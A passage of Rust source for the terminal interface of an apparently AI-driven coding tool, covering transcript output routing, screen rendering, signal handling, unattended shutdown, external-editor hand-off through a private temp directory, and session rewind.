        }
        self.transcript.push(Cell::notice(kind, text));
    }

    fn append_tool_output(&mut self, call_id: Option<String>, bytes: &[u8]) {
        if bytes.is_empty() {
            return;
        }
        let first_cell = self.turn_first_cell();
        // Output of a call the transcript has a row for (or has folded
        // into a job's or agent's row) belongs to that row. The pump of a
        // call the model gave no id reports `None`; its row is the one
        // the narration opened with an empty id.
        let target = match call_id.as_deref() {
            Some(id) => self.tool_output_target(first_cell, id),
            None if self.turn.is_some() => self.anonymous_tool_output_target(first_cell),
            None => None,
        };
        if let Some(target) = target {
            append_output(target, bytes);
            return;
        }
        // Inside a turn the output never merges into a cell from before
        // the turn; outside one (a background job still writing) every
        // chunk of the same call shares the trailing cell, so a chatty
        // job cannot grow the transcript by a cell per read.
        let cells = self.transcript.cells();
        let last = cells.len().checked_sub(1);
        let continues_last = last.is_some_and(|index| {
            index >= first_cell
                && matches!(&cells[index], Cell::Text { call_id: id, .. } if *id == call_id)
        });
        if !continues_last {
            self.transcript.push(Cell::Text {
                call_id,
                lines: Vec::new(),
                open_line: false,
                pending: Vec::new(),
            });
        }
        let Some(Cell::Text {
            lines,
            open_line,
            pending,
            ..
        }) = self.transcript.last_mut()
        else {
            return;
        };
        append_output((lines, open_line, pending), bytes);
    }

    /// The output lines of the call `call_id`: a tool row's own, within
    /// this turn, or those of a call folded into a job's or agent's row,
    /// which a later turn's check reaches back to.
    fn tool_output_target(&mut self, first_cell: usize, call_id: &str) -> Option<OutputTarget<'_>> {
        self.transcript
            .cells_mut()
            .iter_mut()
            .enumerate()
            .rev()
            .filter(|(index, cell)| {
                *index >= first_cell || matches!(cell, Cell::Job { .. } | Cell::Agent { .. })
            })
            .find_map(|(_, cell)| cell.output_for(call_id))
    }

    /// The output lines of a call without an id, within this turn: the
    /// newest running tool row without one (a finished one has had all
    /// its output), or the newest such call folded into a running job's
    /// or agent's row; a finished job or agent takes nothing more.
    fn anonymous_tool_output_target(&mut self, first_cell: usize) -> Option<OutputTarget<'_>> {
        let cells = self.transcript.cells();
        let index = (first_cell..cells.len())
            .rev()
            .find(|&index| match &cells[index] {
                Cell::Tool {
                    call_id, status, ..
                } => call_id.is_empty() && matches!(status, ToolStatus::Running { .. }),
                Cell::Job { calls, status, .. } => {
                    matches!(status, JobStatus::Running)
                        && calls.iter().any(|call| call.call_id.is_empty())
                }
                Cell::Agent { calls, status, .. } => {
                    matches!(status, AgentStatus::Running)
                        && calls.iter().any(|call| call.call_id.is_empty())
                }
                _ => false,
            })?;
        self.transcript.cell_mut(index)?.output_for("")
    }

    /// Gives every queued prompt its unattended answer; used when the UI
    /// is about to go away without a human to ask.
    fn abandon_prompts(&mut self) {
        while let Some(prompt) = self.prompts.pop_front() {
            let _ = prompt.reply.send(unattended_answer(&prompt.req));
        }
    }

    /// What the running turn printed past its capture, already taken in
    /// as notices. Nothing draws the app once the turn's task is lost,
    /// so a panic message that came this way is handed back to be printed
    /// on the restored terminal.
    fn turn_late_output(&self) -> Vec<String> {
        let Some(turn) = &self.turn else {
            return Vec::new();
        };
        self.late_output_since(turn.first_cell)
    }

    /// The exit work's late output: every routing notice since `begin_exit`.
    fn exit_late_output(&self) -> Vec<String> {
        self.late_output_since(self.exit_first_cell)
    }

    fn late_output_since(&self, first_cell: usize) -> Vec<String> {
        let cells = self.transcript.cells();
        cells[first_cell.min(cells.len())..]
            .iter()
            .filter_map(|cell| match cell {
                Cell::Notice {
                    kind: NoticeKind::Routing,
                    text,
                    ..
                } => Some(text.clone()),
                _ => None,
            })
            .collect()
    }

    fn status_text(&self) -> Option<String> {
        if self.exiting {
            return Some("Leaving...".to_string());
        }
        let turn = self.turn.as_ref()?;
        let now = self.clock.now();
        let secs = |since: Instant| now.duration_since(since).as_secs();
        let state = if let Some(tool) = &turn.tool {
            format!("Running {tool}")
        } else if let Some(since) = turn.thinking_since {
            format!("Thinking for {}s", secs(since))
        } else {
            format!(
                "{} . {}s",
                turn.busy.as_deref().unwrap_or("Working"),
                secs(turn.started)
            )
        };
        if self.prompts.is_empty() {
            Some(format!("{state}  Esc to interrupt"))
        } else {
            Some(state)
        }
    }

    fn bottom_pane_rows(&self, area: Rect) -> u16 {
        match self.prompts.front() {
            Some(prompt) => prompt.rows(area.width, area.height),
            None => self.composer.rows() + self.band_rows(area),
        }
    }

    /// The rows the band above the composer takes from the transcript:
    /// what the view asks for, or the queued-lines preview when no view
    /// is open, within what the frame can give once the composer, the
    /// status and footer rows and the transcript's minimum have theirs.
    fn band_rows(&self, area: Rect) -> u16 {
        let room = area
            .height
            .saturating_sub(self.composer.rows() + 2 + TRANSCRIPT_MIN_ROWS);
        let wanted = match self.view {
            View::Composer => queued::preview_rows(&self.queued),
            _ => self.view.band_rows(),
        };
        wanted.min(room)
    }

    /// One frame from state; `frame.area()` is the only size consulted.
    pub(crate) fn render(&mut self, frame: &mut Frame) {
        let area = frame.area();
        self.frame_area = Some(area);
        let [transcript, status, bottom, footer] = Layout::vertical([
            Constraint::Min(0),
            Constraint::Length(1),
            Constraint::Length(self.bottom_pane_rows(area)),
            Constraint::Length(1),
        ])
        .areas(area);

        // The todo panel shares the transcript's rows: beside it on a
        // wide frame, in its place on a narrow one.
        let (transcript, todo) = match (self.todo.visible(), TodoPanel::width_beside(area.width)) {
            (false, _) => (transcript, None),
            (true, Some(width)) => {
                let [transcript, todo] =
                    Layout::horizontal([Constraint::Min(0), Constraint::Length(width)])
                        .areas(transcript);
                (transcript, Some(todo))
            }
            (true, None) => (Rect::ZERO, Some(transcript)),
        };
        let view = self.transcript.view(transcript, &mut self.renderer);
        frame.render_widget(view, transcript);
        if let Some(todo) = todo {
            frame.render_widget(&self.todo, todo);
        }

        frame.render_widget(StatusStrip(self.status_text()), status);

        self.question_area = match self.prompts.front() {
            Some(prompt) => {
                let [question, ..] = prompt.areas(bottom.intersection(area), area);
                frame.render_widget(PromptModal(prompt), bottom);
                Some(question)
            }
            None => {
                let [band, field] = Layout::vertical([
                    Constraint::Length(self.band_rows(area)),
                    Constraint::Min(0),
                ])
                .areas(bottom);
                match &self.view {
                    View::Composer => frame.render_widget(QueuedPreview(&self.queued), band),
                    View::Palette(palette) => frame.render_widget(PaletteView(palette), band),
                    View::HistorySearch(search) => frame.render_widget(SearchView(search), band),
                    View::Rewind(rewind) => frame.render_widget(RewindView(rewind), band),
                }
                let macro_names: Vec<&str> =
                    self.macros.iter().map(|(name, _)| name.as_str()).collect();
                frame.render_widget(
                    self.composer.view(
                        self.config.command_prefix,
                        &macro_names,
                        self.renderer.no_color,
                        self.vi_mode == Some(ViMode::Normal),
                    ),
                    field,
                );
                None
            }
        };

        frame.render_widget(
            FooterBar {
                left: self.footer.text(),
                right: render::styled_line(&self.usage),
            },
            footer,
        );
    }

    /// Records the draw; while a turn runs the elapsed-time row asks for
    /// its next tick here, after the scheduler has forgotten the frame
    /// that was just drawn.
    pub(crate) fn frame_drawn(&mut self) {
        self.frames.frame_drawn();
        if self.turn.is_some() {
            self.frames.schedule_frame_in(STATUS_TICK);
        }
    }
}

struct StatusStrip(Option<String>);

impl Widget for StatusStrip {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        if let Some(text) = self.0 {
            Paragraph::new(Line::from(Span::styled(text, DIM))).render(area, buf);
        }
    }
}

struct FooterBar {
    left: String,
    right: Line<'static>,
}

impl Widget for FooterBar {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        Paragraph::new(Line::from(Span::styled(self.left, DIM))).render(area, buf);
        if self.right.width() > 0 {
            Paragraph::new(self.right.patch_style(DIM))
                .right_aligned()
                .render(area, buf);
        }
    }
}

/// A prompt drawn where the composer was: question, origin, the field or
/// list, hint. A question taller than its rows is cut with a marker
/// counting the hidden lines and a legend offering only Esc; the cap
/// grows with the terminal, so enlarging it shows them.
struct PromptModal<'a>(&'a PendingPrompt);

impl Widget for PromptModal<'_> {
    fn render(self, area: Rect, buf: &mut Buffer) {
        let area = area.intersection(*buf.area());
        if area.is_empty() {
            return;
        }
        let [question, origin, middle, hint] = self.0.areas(area, *buf.area());
        let mut lines = self.0.question_lines(area.width);
        let visible = usize::from(question.height);
        let clipped = lines.len() > visible;
        if clipped && visible > 0 {
            let kept = visible - 1;
            let hidden = lines.len() - kept;
            lines.truncate(kept);
            lines.push(Line::from(Span::styled(
                format!("(+{hidden} more lines; enlarge the terminal)"),
                DIM,
            )));
        }
        Paragraph::new(lines).render(question, buf);
        // A confirm's origin sits in its middle row; every other kind
        // has a row of its own for it above the field or list.
        let origin_row = match self.0.kind() {
            ModalKind::Confirm { .. } => middle,
            _ => origin,
        };
        if let Some(line) = self.0.origin_line() {
            Paragraph::new(Line::from(Span::styled(line, DIM))).render(origin_row, buf);
        }
        match (&self.0.field, self.0.kind()) {
            (Some(field), _) => field.render(middle, buf),
            (None, ModalKind::Confirm { .. }) => {}
            (None, _) => {
                Paragraph::new(self.0.list_lines(usize::from(middle.height))).render(middle, buf);
            }
        }
        Paragraph::new(self.0.hint_lines(area.width, clipped)).render(hint, buf);
    }
}

enum Task {
    Turn {
        handle: JoinHandle<(RequestContext, TurnOutcome)>,
        command: bool,
        /// The context's notification queue, kept while the context is
        /// away: how a line typed mid-turn reaches the model.
        queue: Arc<NotificationQueue>,
    },
    Exit(JoinHandle<(RequestContext, Result<()>, String)>),
}

enum Done {
    Turn(Result<(RequestContext, TurnOutcome), tokio::task::JoinError>),
    Exit(Result<(RequestContext, Result<()>, String), tokio::task::JoinError>),
}

async fn join(task: &mut Option<Task>) -> Done {
    match task.as_mut().expect("polled only while a task runs") {
        Task::Turn { handle, .. } => Done::Turn(handle.await),
        Task::Exit(handle) => Done::Exit(handle.await),
    }
}

/// Sends `line` off with the context as a turn.
fn start_turn(
    app: &mut App,
    ctx: RequestContext,
    abort: &AbortSignal,
    tx: &UnboundedSender<UiMsg>,
    line: String,
) -> Task {
    abort.reset();
    let command = is_command(&line, ctx.app.config.command_prefix);
    app.begin_turn(&line, command);
    let queue = Arc::clone(&ctx.notification_queue);
    Task::Turn {
        handle: spawn_turn(ctx, abort.clone(), line, tx.clone()),
        command,
        queue,
    }
}

#[cfg(unix)]
struct Termination {
    term: tokio::signal::unix::Signal,
    hup: tokio::signal::unix::Signal,
    /// Raw mode turns Ctrl+C into a key, so SIGINT here is always a
    /// `kill -INT` and gets the same orderly leave as SIGTERM.
    int: tokio::signal::unix::Signal,
}

#[cfg(unix)]
impl Termination {
    fn arm() -> std::io::Result<Self> {
        use tokio::signal::unix::{SignalKind, signal};
        Ok(Self {
            term: signal(SignalKind::terminate())?,
            hup: signal(SignalKind::hangup())?,
            int: signal(SignalKind::interrupt())?,
        })
    }

    async fn recv(&mut self) {
        tokio::select! {
            _ = self.term.recv() => {}
            _ = self.hup.recv() => {}
            _ = self.int.recv() => {}
        }
    }

    /// Forgets a SIGINT that landed while the terminal was released. The
    /// editor and coyote share the foreground process group, so a Ctrl+C
    /// meant for the editor also reaches coyote, where it would otherwise
    /// sit latched and end the session at the next select. SIGTERM and
    /// SIGHUP are addressed to coyote itself and stay latched, so a kill
    /// or a lost terminal during the shell-out still quits afterwards.
    fn discard_pending(&mut self) {
        use futures_util::FutureExt;
        while self.int.recv().now_or_never().flatten().is_some() {}
    }
}

#[cfg(not(unix))]
struct Termination;

#[cfg(not(unix))]
impl Termination {
    fn arm() -> std::io::Result<Self> {
        Ok(Self)
    }

    async fn recv(&mut self) {
        std::future::pending().await
    }

    fn discard_pending(&mut self) {}
}

enum Step {
    Input(Option<std::io::Result<crossterm::event::Event>>),
    Msg(Option<UiMsg>),
    Frame,
    /// Boxed: the context rides back inside the join result.
    Work(Box<Done>),
    Signal,
}

/// Why the loop stopped.
enum Leave {
    /// The teardown task ran on the alternate screen; its result and
    /// whatever it printed come along.
    Finished(Result<()>, String),
    /// A termination signal or a closed stdin: nobody is left to answer a
    /// prompt, so the teardown runs after the screen is restored, on the
    /// context the turn handed back (or never left). Boxed for its size.
    Abandoned(Box<RequestContext>),
    /// The same signal or EOF, but the work task did not hand the context
    /// back within the deadline and is still running.
    Outlived(Unfinished),
    /// A work task panicked and took the context with it. The late output
    /// the loop already fed to the app comes along: the panic message
    /// arrives that way, and the app is never drawn again.
    Lost(tokio::task::JoinError, Vec<String>),
}

/// The work task the UI gave up waiting for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Unfinished {
    Turn,
    Exit,
}

impl Unfinished {
    /// How long the UI waited on the task before leaving it behind.
    fn waited(self) -> Duration {
        match self {
            Self::Turn => EXIT_CANCEL_WAIT,
            Self::Exit => EXIT_TEARDOWN_WAIT,
        }
    }

    fn describe(self) -> &'static str {
        match self {
            Self::Turn => "The running turn",
            Self::Exit => "The session teardown",
        }
    }
}

/// The handles the loop holds between steps. `app`, `screen` and `abort`
/// are borrowed because `run` still needs them for the teardown after the
/// loop returns; the rest live and die with the loop.
struct Shell<'a> {
    app: &'a mut App,
    screen: &'a mut Screen,
    /// Always `Some` outside `renew_stream`; the option exists so the old
    /// stream can be dropped before its replacement is built.
    stream: Option<EventStream>,
    termination: Termination,
    rx: UnboundedReceiver<UiMsg>,
    tx: UnboundedSender<UiMsg>,
    abort: &'a AbortSignal,
    auto_cancel: &'a AtomicBool,
}

/// Answers a prompt nobody is left to answer and keeps a notice (late
/// output, a panic's message among it) for the caller; anything else the
/// UI would have drawn is dropped, there being no screen for it.
fn answer_unattended(msg: UiMsg, late: &mut Vec<String>) {
    match msg {
        UiMsg::Prompt { req, reply } => {
            let _ = reply.send(unattended_answer(&req));
        }
        UiMsg::Notice { text, .. } => late.push(text),
        _ => {}
    }
}

/// Waits up to `deadline` for a work task after the UI gave up, answering
/// every prompt it raises meanwhile so the asker never sits on the reply
/// until the deadline. The notices that arrive during the wait come back
/// with the outcome so a panic's message is not lost with the screen.
async fn join_unattended<T>(
    handle: JoinHandle<T>,
    rx: &mut UnboundedReceiver<UiMsg>,
    deadline: Duration,
) -> (Join<T>, Vec<String>) {
    let mut late = Vec::new();
    while let Ok(msg) = rx.try_recv() {
        answer_unattended(msg, &mut late);
    }
    tokio::pin!(handle);
    let joined = tokio::time::timeout(deadline, async {
        loop {
            tokio::select! {
                // The channel first: a notice sent just ahead of the task's
                // end is read before the end is, so it is never left behind.
                biased;
                Some(msg) = rx.recv() => answer_unattended(msg, &mut late),
                joined = &mut handle => return joined,
            }
        }
    })
    .await;
    let joined = match joined {
        Ok(Ok(value)) => Join::Finished(value),
        Ok(Err(err)) => Join::Panicked(err),
        Err(_) => Join::TimedOut,
    };
    (joined, late)
}

/// How the wait on a work task ended.
enum Join<T> {
    Finished(T),
    /// The task panicked; its message went out through the late-output
    /// path, as it does for a panic the loop itself observes.
    Panicked(tokio::task::JoinError),
    /// The deadline passed with the task still running.
    TimedOut,
}

/// Writes to fd 1 after the screen is restored; a failed write (the
/// terminal is gone) is dropped rather than raised, unlike `print!`.
fn write_to_terminal(text: &str) {
    use std::io::Write;
    let mut out = std::io::stdout().lock();
    let _ = out.write_all(text.as_bytes());
    let _ = out.flush();
}

/// The stderr twin of `write_to_terminal`.
fn write_to_stderr(text: &str) {
    use std::io::Write;
    let mut err = std::io::stderr().lock();
    let _ = err.write_all(text.as_bytes());
    let _ = err.flush();
}

/// Ends the process once the UI gave up on a work task that never handed
/// the context back. The task runs on a blocking-pool thread, which
/// nothing can cancel, and the `Runtime` dropped at the end of `main`
/// waits for that thread: the user would be left with a restored, empty
/// terminal and a process that does not exit until the tool does.
/// `top_level_agent_finished` cannot run here because the context is
/// inside the abandoned task. The notice goes through the screen's own
/// descriptor because the task still has fds 1 and 2 captured. Exits 0,
/// the orderly-quit code.
fn exit_leaving_the_task_behind(screen: &mut Screen, unfinished: Unfinished) -> ! {
    let _ = screen.print_line(&format!(
        "{} did not stop within {} s; leaving it behind",
        unfinished.describe(),
        unfinished.waited().as_secs()
    ));
    std::process::exit(0)
}

/// Hands `text` to `editor` (resolved the way the REPL resolves its buffer
/// editor) through a private temp file inside a freshly created private
/// directory, and returns what came back. The directory, not only the
/// file, is private (0700): an editor that saves by writing a new file
/// and renaming it over the old one creates that file with its own mode,
/// and the directory keeps it from other users all the same. No other
/// user can pre-plant a file or symlink at the path. An editor that
/// exits non-zero (or is killed) leaves the text as it was; the directory
/// and whatever the editor left in it are removed on every path.
fn edit_in_editor(editor: &str, text: &str) -> std::io::Result<String> {
    let dir = crate::utils::temp_file("-tui-edit-", "");
    #[cfg(unix)]
    let dir_options = {
        use std::os::unix::fs::DirBuilderExt;
        let mut options = std::fs::DirBuilder::new();
        options.mode(0o700);
        options
    };
    #[cfg(not(unix))]
    let dir_options = std::fs::DirBuilder::new();
    dir_options.create(&dir)?;
    let path = dir.join("buffer.md");
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let written = (|| {
        use std::io::Write;
        options.open(&path)?.write_all(text.as_bytes())
    })();
    if let Err(err) = written {
        let _ = std::fs::remove_dir_all(&dir);
        return Err(err);
    }
    let status = std::process::Command::new(editor).arg(&path).status();
    let edited = std::fs::read_to_string(&path);
    let _ = std::fs::remove_dir_all(&dir);
    let status = status?;
    crate::utils::report_editor_exit(status);
    if !status.success() {
        return Ok(text.to_string());
    }
    Ok(edited?.trim_end_matches('\n').to_string())
}

/// Reads and drops whatever the terminal queued while it was released
/// (to an editor or a stopped job), including events still in flight
/// when control came back. Gives up after `TYPEAHEAD_LIMIT` events so a
/// stream that never goes quiet cannot hold the loop.
async fn flush_typeahead<S>(stream: &mut S)
where
    S: futures_util::Stream<Item = std::io::Result<crossterm::event::Event>> + Unpin,
{
    for _ in 0..TYPEAHEAD_LIMIT {
        let drained = tokio::time::timeout(TYPEAHEAD_GRACE, stream.next()).await;
        if !drained.is_ok_and(|event| event.is_some()) {
            break;
        }
    }
}

/// The UI needs the keyboard and the screen on a terminal; refused before
/// anything else is started on its behalf.
pub fn ensure_tty() -> Result<()> {
    if !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
        bail!("No TTY for TUI")
    }
    Ok(())
}

pub async fn run(mut ctx: RequestContext) -> Result<()> {
    ensure_tty()?;
    let (tx, rx) = unbounded_channel();
    let _active = ActiveGuard::set(tx.clone());
    let auto_cancel = Arc::new(AtomicBool::new(false));
    let sink = Arc::new(TuiSink::new(tx.clone()));
    ctx.ui = Arc::clone(&sink) as Arc<dyn crate::turn::UiSink>;
    ctx.prompter = Arc::new(TuiPrompter::new(tx.clone(), Arc::clone(&auto_cancel)));
    let _subscription = BusSubscription::new(sink as Arc<dyn EventSink>);
    let abort = create_abort_signal();
    let mut app = App::new(
        Arc::new(SystemClock),
        Arc::clone(&ctx.app.config),
        Arc::clone(&ctx.prompt_memory),
        FooterInfo::from_ctx(&ctx),
    )?;
    // The first frame reads the context the way every later idle return
    // does: the palette's command set in particular, which is otherwise
    // the bare one until the first command hands the context back.
    app.sync_from_ctx(&mut ctx);

    // Fd 1 is still the terminal here; a turn's capture takes it over.
    remember_tty();
    let mut screen = Screen::enter()?;
    // Armed only once the terminal is ours. Entering blocks on the
    // keyboard-enhancement probe, which spins on a tty whose master has
    // gone away; with the streams armed earlier the SIGHUP for that
    // hang-up would sit latched in tokio with nothing polling it, and the
    // process would be left at full CPU. Under the default disposition it
    // dies the ordinary way, and `Screen`'s Drop still restores the
    // terminal if arming fails.
    let termination = Termination::arm()?;
    #[cfg(debug_assertions)]
    if std::env::var(PANIC_AT_START_ENV).as_deref() == Ok("1") {
        panic!("{PANIC_AT_START_ENV} requested a panic after entering the alternate screen");
    }
    app.schedule_frame();
    let mut shell = Shell {
        app: &mut app,
        screen: &mut screen,
        stream: Some(EventStream::new()),
        termination,
        rx,
        tx,
        abort: &abort,
        auto_cancel: &auto_cancel,
    };

    let leave = run_loop(&mut shell, ctx).await;
    let mut rx = shell.rx;
    let tx = shell.tx;
    // The event reader would otherwise keep swallowing keystrokes from
    // the cooked terminal while the teardown below prints and waits.
    drop(shell.stream);
    // Whatever ended the loop, no screen is left to ask on: a question
    // raised during the teardown below answers itself.
    auto_cancel.store(true, Ordering::SeqCst);

    if let Err(err) = screen.leave() {
        warn!("Failed to restore the terminal: {err}");
    }
    // What the exit printed goes to the restored terminal with its colours
    // but without anything that could move the cursor or change a mode.
    // A terminal that is already gone (EIO after a hang-up) must not turn
    // the write into a panic ahead of the hook drain below.
    let result = match leave {
        Leave::Finished(result, captured) => {
            write_to_terminal(&render::sanitize_ansi(&captured));
            result
        }
        // The exit work gets the same bounded, unattended wait the loop
        // gives it; a teardown that never returns ends the process the
        // way an outlived task does instead of hanging a bare terminal.
        Leave::Abandoned(ctx) => {
            let (joined, mut late) = join_unattended(
                spawn_exit(*ctx, abort.clone(), tx.clone()),
                &mut rx,
                EXIT_TEARDOWN_WAIT,
            )
            .await;
            match joined {
                Join::Finished((_, result, captured)) => {
                    write_to_terminal(&render::sanitize_ansi(&captured));
                    result
                }
                Join::Panicked(err) => {
                    // The panic's message came through the capture as late
                    // output; it goes to the restored terminal like a lost
                    // turn's does.
                    settle_late_notices(&mut rx, &mut late).await;
                    for text in late {
                        write_to_stderr(&format!("{}\n", render::plain_text(&text)));
                    }
                    Err(err.into())
                }
                Join::TimedOut => {
                    crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
                    exit_leaving_the_task_behind(&mut screen, Unfinished::Exit)
                }
            }
        }
        Leave::Outlived(unfinished) => {
            crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
            exit_leaving_the_task_behind(&mut screen, unfinished)
        }
        Leave::Lost(err, mut late) => {
            settle_late_notices(&mut rx, &mut late).await;
            for text in late {
                write_to_stderr(&format!("{}\n", render::plain_text(&text)));
            }
            Err(err.into())
        }
    };
    crate::hooks::drain_pending(EXIT_HOOK_DRAIN_TIMEOUT).await;
    result.map(|_| ())
}

/// The late output the UI drew followed by what arrived during the wait
/// on the task, without a notice counted twice: the wait's notices were
/// never drawn, so none of them is in the drawn list.
fn with_late(mut drawn: Vec<String>, waited: Vec<String>) -> Vec<String> {
    drawn.extend(waited);
    drawn
}

/// Collects the notices a lost task's capture is still forwarding. The
/// drain thread hands the pipe's contents over after the guard went
/// down, so the queue gets the same bounded quiet-gap settle a finished
/// turn's capture gets before it is read.
async fn settle_late_notices(rx: &mut UnboundedReceiver<UiMsg>, late: &mut Vec<String>) {
    let started = Instant::now();
    let mut last = started;
    loop {
        let now = Instant::now();
        if now.duration_since(last) >= redirect::QUIET_GAP
            || now.duration_since(started) >= redirect::SETTLE_LIMIT
        {
            return;
        }
        let wait = (last + redirect::QUIET_GAP).min(started + redirect::SETTLE_LIMIT) - now;
        match tokio::time::timeout(wait, rx.recv()).await {
            Ok(Some(UiMsg::Notice { text, .. })) => {
                late.push(text);
                last = Instant::now();
            }
            Ok(Some(_)) => last = Instant::now(),
            Ok(None) | Err(_) => return,
        }
    }
}

/// What a user's quit does to the shared abort signal. During a turn it
/// interrupts the turn, which the exit then reports as interrupted. Idle,
/// it clears whatever an earlier Esc left on the signal: the signal is
/// shared across turns and nothing else resets it between a turn's end
/// and the exit work, which would otherwise report a clean quit as an
/// interrupted one. A SIGTERM or hang-up keeps setting the flag itself.
fn quit_abort(abort: &AbortSignal, turn_running: bool) {
    if turn_running {
        abort.set_ctrlc();
    } else {
        abort.reset();
    }
}

/// Takes the user's lines off the running turn's queue. The strip was
/// cleared with the interrupt or the quit; the copies on the queue must
/// go too, or the next tool round would still hand them to the model
/// and a quit's final tool result could carry them.
fn purge_turn_queue(task: &Option<Task>) {
    if let Some(Task::Turn { queue, .. }) = task {
        take_user_messages(queue);
    }
}

/// Takes the `pops` newest exchanges out of the session, stopping at
/// the first that cannot be undone: how many came out, and what stopped
/// it short.
fn rewind_exchanges(ctx: &mut RequestContext, pops: usize) -> (usize, Option<anyhow::Error>) {
    for popped in 0..pops {
        if let Err(err) = ctx.undo_last_exchange() {
            return (popped, Some(err));
        }
    }
    (pops, None)
}

/// Takes the chosen exchanges out of the session and the transcript and
/// gives the oldest one's prompt back to the composer. Every offered row
/// sits above the newest macro turn, so each one is a single exchange
/// and popping one per row keeps the session and the transcript in
/// step; the transcript goes back only as far as the session did, and a
/// stop short of the choice is said. Without a session there is nothing
/// to pop and the transcript is the whole of the rewind. The composer
/// gets the row's own text, not the session's prefill: a command row
/// holds the command, which the session never did.
fn apply_rewind(app: &mut App, ctx: &mut RequestContext, target: RewindTarget) {
    let chosen = target.rows.len();
    let (cut, stopped) = if ctx.session.is_some() {
        rewind_exchanges(ctx, chosen)
    } else {
        (chosen, None)
    };
    app.sync_from_ctx(ctx);
    if let Some(row) = cut
        .checked_sub(1)
        .and_then(|oldest| target.rows.get(oldest))
    {
        app.transcript.truncate(row.opener);
        app.set_composer_text(&row.title);
    }
    app.refresh_palette(Some(ctx));
    // The notice is a transcript cell, so it goes in after the cut or
    // the cut would take it with the exchanges.
    if let Some(err) = stopped {
        app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::ToolWarning,
            text: format!("Rewind stopped: {err}"),
        });
    }
}

/// Replaces the event stream, dropping the old one first. Constructing a
/// crossterm stream takes the shared reader lock, and the old stream's
/// pending poll holds that lock until the stream is dropped (dropping it
/// sets its shutdown flag and wakes the poll). During a turn the run loop
/// always has a poll in flight, so building the new stream before
/// dropping the old one would wait on the lock until the next keystroke.
fn renew_stream(stream: &mut Option<EventStream>) {
    drop(stream.take());
    *stream = Some(EventStream::new());
}

/// Hands the terminal to `f` in its normal modes and takes it back: the
/// event stream is restarted around the release so nothing it had in
/// flight lands on the child or comes back as a keystroke, a Ctrl+C
/// meant for the child is forgotten, and what the terminal queued
/// meanwhile is dropped.
async fn with_terminal_released<T>(
    screen: &mut Screen,
    stream: &mut Option<EventStream>,
    termination: &mut Termination,
    f: impl FnOnce() -> T,
) -> std::io::Result<T> {
    renew_stream(stream);
    let released = screen.with_terminal_released(f);
    termination.discard_pending();
    flush_typeahead(
        stream
            .as_mut()
            .expect("the event stream is renewed in place"),
    )
    .await;
    released
}

async fn run_loop(shell: &mut Shell<'_>, ctx: RequestContext) -> Leave {
    let Shell {
        app,
        screen,
        stream,
        termination,
        rx,
        tx,
        abort,
        auto_cancel,
    } = shell;
    let mut ctx = Some(ctx);
    let mut task: Option<Task> = None;
    let mut quit_requested = false;
    let mut frame_failing = false;
    loop {
        let step = tokio::select! {
            event = stream.as_mut().expect("the event stream is renewed in place").next() => Step::Input(event),
            msg = rx.recv() => Step::Msg(msg),
            _ = app.frames.next_frame() => Step::Frame,
            done = join(&mut task), if task.is_some() => Step::Work(Box::new(done)),
            _ = termination.recv() => Step::Signal,
        };
        match step {
            Step::Signal | Step::Input(None) | Step::Input(Some(Err(_))) => {
                // Nobody is left to answer: prompts not yet asked answer
                // themselves, the queued and in-flight ones are answered
                // here, and only then is the turn told to stop.
                auto_cancel.store(true, Ordering::SeqCst);
                app.begin_exit();
                app.abandon_prompts();
                purge_turn_queue(&task);
                return match task.take() {
                    Some(Task::Turn { handle, .. }) => {
                        abort.set_ctrlc();
                        let (joined, late) = join_unattended(handle, rx, EXIT_CANCEL_WAIT).await;
                        match joined {
                            Join::Finished((returned, _)) => Leave::Abandoned(Box::new(returned)),
                            Join::Panicked(err) => {
                                Leave::Lost(err, with_late(app.turn_late_output(), late))
                            }
                            Join::TimedOut => Leave::Outlived(Unfinished::Turn),
                        }
                    }
                    Some(Task::Exit(handle)) => {
                        let (joined, late) = join_unattended(handle, rx, EXIT_TEARDOWN_WAIT).await;
                        match joined {
                            Join::Finished((_, result, captured)) => {
                                Leave::Finished(result, captured)
                            }
                            Join::Panicked(err) => {
                                Leave::Lost(err, with_late(app.exit_late_output(), late))
                            }
                            Join::TimedOut => Leave::Outlived(Unfinished::Exit),
                        }
                    }
                    None => Leave::Abandoned(Box::new(
                        ctx.take()
                            .expect("the context is in hand while no task runs"),
                    )),
                };
            }
            Step::Input(Some(Ok(event))) => {
                let command = app.handle_input(events::classify(event));
                match command {
                    Some(Command::Submit(line)) => {
                        if let Some(ctx) = ctx.take() {
                            task = Some(start_turn(app, ctx, abort, tx, line));
                        } else {
                            // Submit is not mapped while a task holds the
                            // context; should that ever change, the draft
                            // goes back rather than vanishing.
                            debug_assert!(false, "a submit while the context was away");
                            app.set_composer_text(&line);
                        }
                    }
                    Some(Command::Queue(text)) => {
                        if let Some(Task::Turn { queue, .. }) = &task {
                            queued::queue_user_message(queue, &text);
                        }
                    }
                    Some(Command::Unqueue { held, draft }) => {
                        if let Some(Task::Turn { queue, .. }) = &task {
                            if let Some(text) = held
                                && !queued::unqueue_user_message(queue, &text)
                            {
                                app.handle_msg(UiMsg::Notice {
                                    kind: NoticeKind::ToolWarning,
                                    text: "already sent to the model".to_string(),
                                });
                            }
                            if let Some(text) = draft {
                                queued::queue_user_message(queue, &text);
                            }
                        }
                    }
                    Some(Command::Interrupt) => {
                        abort.set_ctrlc();
                        purge_turn_queue(&task);
                    }
                    Some(Command::Quit) => {
                        quit_requested = true;
                        quit_abort(abort, task.is_some());
                        purge_turn_queue(&task);
                    }
                    Some(Command::Suspend) => {
                        #[cfg(unix)]
                        {
                            let released =
                                with_terminal_released(screen, stream, termination, || {
                                    // SAFETY: raise takes a signal number and no pointers.
                                    unsafe { libc::raise(libc::SIGTSTP) };
                                })
                                .await;
                            if let Err(err) = released {
                                warn!("Failed to re-enter the alternate screen: {err}");
                            }
                            app.schedule_frame();
                        }
                    }
                    Some(Command::OpenEditor) => {
                        let text = app.composer_text();
                        match app.config.editor() {
                            Ok(editor) => {
